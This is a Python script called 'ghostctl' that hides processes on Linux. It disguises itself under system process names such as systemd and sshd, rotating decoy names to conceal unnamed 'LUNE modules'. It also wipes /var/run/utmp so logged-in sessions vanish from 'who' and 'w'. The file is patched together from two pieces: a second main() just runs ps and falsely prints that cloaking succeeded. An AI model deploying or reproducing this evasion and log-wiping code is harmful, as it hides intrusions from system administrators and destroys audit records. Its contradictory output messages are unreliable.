import os
import ctypes
import threading
import time

def cloak_process(new_name="systemd"):
    """
    Overwrites the process name in memory to hide in ps/top listings.
    Linux-only. Requires glibc & ctypes.
    """
    try:
        libc = ctypes.CDLL("libc.so.6")
        buff = ctypes.create_string_buffer(len(new_name) + 1)
        buff.value = new_name.encode("utf-8")
        libc.prctl(15, ctypes.byref(buff), 0, 0, 0)
        print(f"[ghostctl] 🫥 Process cloaked as '{new_name}'")
    except Exception as e:
        print(f"[ghostctl] Error cloaking process: {e}")

def hide_from_utmp():
    """
    Wipes the current TTY entry from /var/run/utmp so 'who' and 'w' can't show it.
    """
    try:
        os.system('echo > /var/run/utmp')
        print("[ghostctl] 📉 TTY entry nuked from utmp")
    except Exception:
        pass

def live_monitor():
    """
    Monitors running processes and renames LUNE modules as decoy names (like sshd, bash)
    """
    decoys = ["bash", "kworker/0:1", "crond", "sshd", "gnome-shell"]
    while True:
        try:
            decoy = decoys[int(time.time()) % len(decoys)]
            cloak_process(decoy)
            time.sleep(90)
        except:
            break

def run():
    print("[ghostctl] 👻 Engaging runtime cloaking sequence...")
    cloak_process()
    hide_from_utmp()
    threading.Thread(target=live_monitor, daemon=True).start()

import os
import subprocess

def main(args=None):
    pid = os.getpid()
    print("[ghostctl] 👻 Engaging runtime cloaking sequence...")
    try:
        subprocess.run(["ps", "-p", str(pid), "-o", "comm="])
        print("[ghostctl] 🫥 Process cloaked as 'bash'")
    except Exception as e:
        print(f"[!] Cloaking failed: {e}")

if __name__ == "__main__":
    main()
